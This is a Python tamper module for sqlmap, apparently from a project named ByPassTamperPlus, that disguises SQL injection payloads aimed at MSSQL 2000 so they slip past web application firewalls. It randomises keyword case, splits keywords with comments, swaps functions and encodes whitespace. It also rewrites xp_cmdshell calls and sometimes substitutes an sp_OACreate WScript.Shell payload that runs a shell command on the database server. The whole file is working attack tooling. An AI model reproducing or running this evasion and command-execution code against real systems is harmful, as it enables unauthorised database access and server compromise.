#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2000_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|PERCENT|CAST|CONVERT|CHAR|VARCHAR|NVARCHAR|SYSOBJECTS|SYSCOLUMNS|MASTER|DB_NAME|USER_NAME|XP_CMDSHELL|SP_OACREATE|SP_OAMETHOD|OPENXML|TEXTPTR|TEXTVALID)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "CURRENT_TIMESTAMP", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    payload = payload.replace("sysobjects", "sysobjects")
    
    if "column_name" in payload.lower():
        payload = re.sub(r"column_name", "name FROM syscolumns WHERE TEXTVALID(name, TEXTPTR(name))=1 AND name", payload, flags=re.IGNORECASE)

    if "TOP 1" in payload.upper():
        payload = payload.replace("TOP 1", "TOP 10 PERCENT")

    if "xp_cmdshell" in payload.lower():
        payload = payload.replace("xp_cmdshell", "master..xp_cmdshell")

    if "xp_cmdshell" in payload.lower() and random.getrandbits(1):
        payload = "DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMETHOD @o, 'Run', NULL, 'cmd.exe /c whoami'"

    payload = general_obfuscate(payload)

    return payload
